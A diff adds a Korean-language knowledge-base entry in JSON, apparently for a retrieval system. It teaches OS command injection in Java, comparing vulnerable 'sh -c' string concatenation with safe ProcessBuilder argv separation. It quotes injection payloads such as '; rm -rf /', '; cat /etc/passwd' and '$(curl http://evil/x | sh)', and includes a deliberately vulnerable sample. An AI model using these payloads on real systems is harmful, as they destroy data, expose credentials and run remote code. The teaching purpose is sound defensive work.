@@ -1,0 +1,56 @@
+{
+  "id": "security/command-injection-primer",
+  "title": "OS Command Injection 입문: 셸 명령 실행과 입력 결합 취약점",
+  "category": "security",
+  "level": "intermediate",
+  "summary": "이 문서는 Runtime.exec나 ProcessBuilder로 외부 OS 명령을 실행할 때 사용자 입력을 문자열로 이어 붙여 /bin/sh -c \"...\"에 넘기면 셸이 한 번 더 해석하면서 ;·|·&·$()·백틱 같은 메타문자로 임의 명령이 실행되는 command injection(명령어 주입) 취약점이 왜 위험한지, 안전한 방어(셸을 피하고 ProcessBuilder에 명령·인자를 argv 배열/리스트로 분리 전달, 형식 allowlist, 사용자 입력을 셸 문자열에 직접 넣지 않기)는 무엇인지, 그리고 sink가 DB인 SQL injection과 sink가 셸인 command injection이 어떻게 다른지를 구체적 Java 취약/안전 코드와 함께 정리한다.",
+  "body_markdown": "# OS Command Injection 입문: 셸로 명령 실행할 때의 입력 결합 취약점\n\n> 한 줄 요약: 외부 명령을 실행할 때 사용자 입력을 문자열로 이어 붙여 `/bin/sh -c \"...\"` 같은 셸에 통째로 넘기면, 셸이 한 번 더 해석하면서 `;`, `|`, `$()` 같은 메타문자로 공격자가 임의 명령을 끼워 실행할 수 있다 — 방어의 핵심은 \"셸을 거치지 않고\" ProcessBuilder에 인자를 배열/리스트로 분리해 넘기는 것이다.\n\n**난이도: 🟡 Intermediate**\n\n관련 문서:\n\n- [입력값 검증 기초](./input-validation-basics.md)\n- [SQL 인젝션 기초](./sql-injection-basics.md)\n- [Path / Directory Traversal 입문](./path-traversal-primer.md)\n- [SSRF / Egress Control](./ssrf-egress-control.md)\n- [OWASP Top 10 기초](./owasp-top10-basics.md)\n\nretrieval-anchor-keywords: command injection, os command injection, 명령어 주입, 셸 인젝션, shell injection, Runtime.exec, ProcessBuilder, /bin/sh -c, 셸 메타문자, shell metacharacter, 세미콜론 파이프, ; | & $() backtick, 사용자 입력 명령 실행, allowlist 명령, argv 분리, sql injection 차이, RCE 원격 코드 실행\n\n## 핵심 개념 (정의)\n\n**OS Command Injection(운영체제 명령어 주입)**은, 애플리케이션이 외부 OS 명령을 실행할 때 신뢰할 수 없는 입력(사용자 입력, 헤더, 파일명 등)을 명령 문자열에 그대로 섞어 넣어서, 공격자가 의도하지 않은 추가 명령을 실행시키는 취약점이다.\n\n핵심은 **\"명령 문자열이 셸(shell)을 한 번 더 거치느냐\"**다.\n\n- `ping -c 1 <호스트>` 를 실행하고 싶을 때\n- 코드가 `\"ping -c 1 \" + host` 처럼 문자열을 만들어 `/bin/sh -c \"ping -c 1 8.8.8.8; rm -rf /\"` 형태로 셸에 넘기면\n- 셸은 이걸 **두 개의 명령**(`ping ...` 와 `rm -rf /`)으로 해석한다.\n\n즉 우리 프로그램은 \"ping 하나만 실행할 의도\"였지만, 셸이라는 중간 해석기가 입력 안의 `;`를 명령 구분자로 받아들여 임의 명령을 추가 실행한다. 이것이 command injection이고, 성공하면 보통 **RCE(원격 코드 실행)**로 이어지는 가장 심각한 부류의 취약점이다.\n\n## 왜 위험한가 (직관)\n\n셸은 사람이 편하게 쓰라고 만든 도구라서 \"한 줄에 여러 일\"을 하도록 풍부한 문법을 가진다. 그 문법이 곧 공격 표면이다.\n\n대표적인 셸 메타문자:\n\n- `;` — 명령 구분 (`a; b` → a 실행 후 b 실행)\n- `|` — 파이프 (`a | b` → a 출력을 b 입력으로)\n- `&` / `&&` / `||` — 백그라운드 실행 / 조건부 연결\n- `$(...)`, `` `...` `` — 명령 치환 (안쪽 명령 결과로 치환)\n- `>`, `<`, `>>` — 리다이렉션 (파일 덮어쓰기/읽기)\n- `*`, `?` — 글로빙(파일명 확장)\n\n문제의 본질은 **\"두 번 해석\"**이다. 우리는 명령 하나를 실행할 의도지만, `sh -c \"문자열\"`로 넘기는 순간 셸이 그 문자열을 다시 파싱하면서 데이터(사용자 입력)와 코드(명령 구문)의 경계가 사라진다. 입력 안의 `;`나 `$(...)`가 데이터가 아니라 **명령**으로 승격되는 것이다.\n\n피해 규모도 크다. 웹 애플리케이션 권한으로 임의 OS 명령을 실행하면, 서버 파일 읽기/쓰기, 역방향 셸(reverse shell) 연결, 내부망 정찰, 자격증명 탈취까지 한 번에 가능하다.\n\n## 상세 분해: 어디서 셸이 끼어드나\n\n자바에서 명령 실행 경로를 보면, **셸을 거치는 형태**가 위험하다.\n\n1. `Runtime.getRuntime().exec(String command)` — 인자가 **하나의 문자열**이면 자바가 공백 기준으로 토큰화한다. 흔히 개발자가 셸 기능(파이프, 리다이렉션)을 쓰려고 `sh -c \"...\"`로 감싸는데, 이때 셸이 등장한다.\n2. `Runtime.getRuntime().exec(String[] cmdarray)` — 인자를 **배열**로 주면 자바가 토큰화하지 않고 각 원소를 그대로 argv로 전달한다. 다만 배열 안에 `sh -c \"사용자입력 포함 문자열\"`을 넣으면 다시 위험해진다.\n3. `new ProcessBuilder(List<String> command)` / `ProcessBuilder(String... command)` — 각 인자를 분리된 argv로 OS의 `execve`에 직접 전달한다. **셸을 거치지 않는다.** 이게 안전한 기본형이다.\n\n정리하면 위험의 방아쇠는 \"exec를 썼냐\"가 아니라 **\"사용자 입력이 셸 해석을 받는 한 문자열에 들어갔냐\"**다.\n\n```\n[안전 경로]  앱 -> ProcessBuilder([\"ping\",\"-c\",\"1\", host]) -> execve(\"/bin/ping\", [\"ping\",\"-c\",\"1\",\"8.8.8.8; rm -rf /\"])\n             => \"8.8.8.8; rm -rf /\" 전체가 ping 의 \"하나의 인자\"일 뿐, 명령으로 안 쪼개짐 (ping 이 호스트 해석 실패할 뿐)\n\n[위험 경로]  앱 -> sh -c \"ping -c 1 8.8.8.8; rm -rf /\"\n             => 셸이 ';' 보고 두 명령으로 분리 -> rm -rf / 실행됨\n```\n\nargv 분리 전달이 안전한 이유는, 운영체제의 `execve`는 **인자 배열을 그대로** 프로그램에 전달할 뿐 메타문자를 해석하지 않기 때문이다. `\"8.8.8.8; rm -rf /\"`는 ping 입장에서 그냥 \"이상하게 생긴 호스트 이름 하나\"이고, 잘못된 호스트라 ping이 실패할 뿐 `rm`은 결코 실행되지 않는다.\n\n## SQL Injection과의 차이 (혼동 정리)\n\n둘 다 \"데이터와 코드의 경계가 무너지는\" 같은 뿌리의 결함이지만 **sink(최종 도달 지점)**가 다르다.\n\n| 구분 | SQL Injection | Command Injection |\n|---|---|---|\n| 입력이 흘러드는 곳(sink) | DB 쿼리 파서 | OS 셸 / 명령 실행기 |\n| 해석하는 주체 | 데이터베이스 엔진 | `/bin/sh` 등 셸 |\n| 표준 방어 | PreparedStatement(파라미터 바인딩) | 셸 회피 + argv 분리(ProcessBuilder), allowlist |\n| 성공 시 결과 | 데이터 유출/변조 | 임의 코드 실행(RCE) — 보통 더 치명적 |\n\n방어 철학은 동일하다: **데이터를 코드 문맥에 섞지 말고, 데이터는 데이터 채널로(파라미터/argv)만 전달**하라. PreparedStatement가 \"쿼리 구조는 고정, 값은 바인딩\"이라면, ProcessBuilder argv 분리는 \"명령·인자 구조는 고정, 사용자 값은 인자 한 칸으로\"에 해당한다.\n\n## 흔한 오해와 함정\n\n- **\"위험 문자(`;`, `|` 등)만 막으면 안전하다\"** → blocklist(차단 목록)는 항상 빠진다. `$(...)`, 개행, 인코딩, 새 셸 문법까지 다 막기 어렵다. 근본 해법은 **셸 자체를 안 쓰는 것**이다.\n- **\"ProcessBuilder를 쓰면 무조건 안전\"** → 아니다. `new ProcessBuilder(\"/bin/sh\", \"-c\", userInput)` 처럼 셸을 다시 불러오면 똑같이 취약하다. 안전은 \"셸을 안 거치고 argv 분리\"에서 온다.\n- **\"입력을 따옴표로 감싸면 된다(`\"... \"+input+\"...\"`)\"** → 셸 따옴표 이스케이프는 경계 케이스가 많아 거의 항상 우회된다. 직접 따옴표 처리로 막으려는 시도는 안티패턴이다.\n- **\"파이프/리다이렉션을 쓰려면 셸이 꼭 필요하다\"** → 대부분 자바 코드에서 `ProcessBuilder`의 스트림 연결, `redirectOutput`, 여러 프로세스를 직접 잇는 방식으로 셸 없이 구현할 수 있다.\n- **\"내부용 도구라 입력이 안전하다\"** → 파일명, 업로드 이름, 로그에서 읽은 값 등 \"사람이 직접 안 친\" 값도 신뢰할 수 없는 입력이다.\n\n## 코드로 보기 (Java)\n\n### 취약 코드\n\n```java\n// 안티패턴: 사용자 입력을 셸 문자열에 직접 결합\npublic String pingHost(String host) throws IOException {\n    // host = \"8.8.8.8; rm -rf /var/www\" 이면 두 명령이 실행됨\n    String cmd = \"ping -c 1 \" + host;\n    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd});\n    // ... 출력 읽기 ...\n    return readAll(p.getInputStream());\n}\n```\n\n여기서 `host`에 `8.8.8.8; cat /etc/passwd` 또는 `$(curl http://evil/x | sh)`를 넣으면 셸이 그대로 실행한다. RCE다.\n\n### 안전 코드 — 셸을 거치지 않고 argv 분리\n\n```java\n// 권장: ProcessBuilder 에 인자를 \"분리된 리스트\"로 전달 → 셸 미경유\npublic String pingHost(String host) throws IOException, InterruptedException {\n    // 1) 입력을 도메인/숫자 형식으로 엄격 검증 (allowlist 형식 검증)\n    if (!host.matches(\"^[A-Za-z0-9.\\\\-]{1,253}$\")) {\n        throw new IllegalArgumentException(\"허용되지 않은 호스트 형식\");\n    }\n\n    // 2) 명령과 인자를 각각 분리된 argv 원소로 — 절대 한 문자열로 합치지 않는다\n    ProcessBuilder pb = new ProcessBuilder(\"ping\", \"-c\", \"1\", host);\n    pb.redirectErrorStream(true);\n    Process p = pb.start();\n    String out = readAll(p.getInputStream());\n    p.waitFor();\n    return out;\n}\n```\n\n`host`가 검증을 통과하더라도 `ping`의 \"하나의 인자\"로만 전달되므로 `;`나 `$()`가 명령으로 해석될 통로 자체가 없다. 검증(allowlist 형식)과 argv 분리를 함께 쓰면 방어가 이중으로 단단해진다.\n\n### 더 강한 형태 — 실행 가능한 명령 자체를 allowlist 로 고정\n\n```java\n// 사용자가 \"어떤 명령을 돌릴지\" 고를 수 있어야 한다면, 자유 입력이 아니라 enum/맵으로 고정\nprivate static final Map<String, List<String>> ALLOWED = Map.of(\n    \"diskUsage\", List.of(\"df\", \"-h\"),\n    \"uptime\",    List.of(\"uptime\")\n);\n\npublic String runDiagnostic(String action) throws IOException {\n    List<String> argv = ALLOWED.get(action); // 키가 없으면 null\n    if (argv == null) {\n        throw new IllegalArgumentException(\"허용되지 않은 진단 명령\");\n    }\n    return readAll(new ProcessBuilder(argv).start().getInputStream());\n}\n```\n\n여기서 사용자 입력은 \"명령 문자열\"이 아니라 \"미리 정의된 동작의 키\"일 뿐이다. 실제 실행되는 argv는 코드에 하드코딩되어 있어 주입 통로가 없다.\n\n## 면접/시니어 질문 미리보기\n\n**Q. command injection은 왜 생기고, 왜 셸을 피하는 게 근본 해법인가요?**\n명령 문자열을 `sh -c \"...\"`로 넘기면 셸이 입력을 다시 파싱하면서 `;`, `|`, `$()` 같은 메타문자를 명령 구문으로 해석한다. 데이터와 코드의 경계가 무너지는 것이다. ProcessBuilder로 명령과 인자를 분리된 argv로 넘기면 OS의 execve가 메타문자를 해석하지 않고 인자를 그대로 전달하므로, 입력이 추가 명령으로 승격될 통로 자체가 없어진다.\n\n**Q. 위험 문자 필터링(blocklist)으로 막으면 안 되나요?**\n거의 항상 우회된다. 인코딩, 개행, 명령 치환, 새로운 셸 문법 등 빠지는 경우가 너무 많다. 형식 검증(allowlist)은 보조 방어로 가치가 있지만, 1차 방어는 \"셸을 안 쓰고 argv를 분리\"하는 구조적 방법이어야 한다.\n\n**Q. SQL injection과 command injection의 공통점과 차이는?**\n공통점은 신뢰할 수 없는 입력을 코드 문맥에 직접 섞어 데이터/코드 경계가 무너진다는 것. 차이는 sink다. SQLi는 DB 쿼리 파서로, command injection은 OS 셸로 입력이 흘러든다. 방어도 같은 철학(파라미터/argv로 데이터만 전달)이지만 도구가 PreparedStatement vs ProcessBuilder로 다르다. 성공 시 영향은 command injection이 보통 RCE라 더 치명적이다.\n\n## 한 줄 정리\n\nCommand injection은 사용자 입력이 셸 해석을 받는 명령 문자열(`sh -c \"...\"`)에 섞여 `;`·`|`·`$()` 같은 메타문자로 임의 명령이 실행되는 RCE급 취약점이며, 근본 방어는 셸을 거치지 않고 ProcessBuilder에 명령·인자를 argv 배열로 분리 전달하고 형식 allowlist로 입력을 엄격 검증하는 것이다.\n",
+  "aliases": [
+    "OS command injection",
+    "명령어 주입 취약점",
+    "셸 인젝션 shell injection",
+    "Runtime.exec 위험",
+    "ProcessBuilder argv 분리",
+    "sh -c 사용자 입력 위험",
+    "셸 메타문자 임의 명령 실행",
+    "command injection 방어",
+    "명령 실행 RCE 취약점"
+  ],
+  "expected_queries": [
+    "command injection이 뭐야? 왜 위험해?",
+    "Runtime.exec로 사용자 입력 명령 실행하면 위험한 이유가 뭐야?",
+    "ProcessBuilder로 명령 실행할 때 인자를 어떻게 넘겨야 안전해?",
+    "셸 메타문자로 임의 명령이 실행되는 걸 어떻게 막아?",
+    "command injection이랑 SQL injection은 뭐가 달라?"
+  ],
+  "symptoms": [
+    "사용자 입력을 \"ping -c 1 \" + host 처럼 명령 문자열에 직접 이어 붙여 sh -c로 실행한다",
+    "위험 문자(;, |)만 필터링하는 blocklist로 막으려다 $()·개행·인코딩으로 우회당한다",
+    "ProcessBuilder를 쓰면서도 /bin/sh -c 로 셸을 다시 불러 argv 분리의 이점을 잃는다",
+    "command injection과 SQL injection의 sink(셸 vs DB) 차이를 구분하지 못한다"
+  ],
+  "relations": {
+    "prerequisites": [
+      "security/input-validation-basics",
+      "security/sql-injection-basics"
+    ],
+    "next_docs": [
+      "security/path-traversal-primer",
+      "security/ssrf-egress-control",
+      "security/owasp-top10-basics"
+    ],
+    "confusable_with": [
+      "security/sql-injection-basics",
+      "security/path-traversal-primer",
+      "security/ssrf-egress-control"
+    ],
+    "forbidden_for_queries": []
+  },
+  "learner_query_patterns": [],
+  "metadata": {
+    "schema_version": "v2",
+    "created_at": "2026-05-31",
+    "last_modified": "2026-05-31",
+    "revision_history": []
+  }
+}
